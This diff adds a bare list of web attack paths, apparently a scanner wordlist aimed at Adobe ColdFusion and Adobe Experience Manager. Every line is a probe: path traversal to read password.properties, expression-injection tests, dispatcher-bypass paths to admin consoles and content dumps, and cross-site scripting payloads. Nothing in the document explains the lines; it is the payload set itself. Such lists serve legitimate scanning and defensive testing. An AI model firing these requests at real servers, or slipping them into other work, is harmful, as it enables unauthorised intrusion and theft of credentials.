@@ -1,0 +1,14 @@
+/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
+/system/console?.css
+/mnt/overlay/dam/gui/content/assets/metadataeditor.external.html?item=$%7b{{num1}}*{{num2}}%7d
+//CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
+/hax/..CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
+/system/console/bundles
+///system///console///bundles
+/crx/explorer/nodetypes/index.jsp
+{{paths}}
+//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
+/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
+/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
+/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
+/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
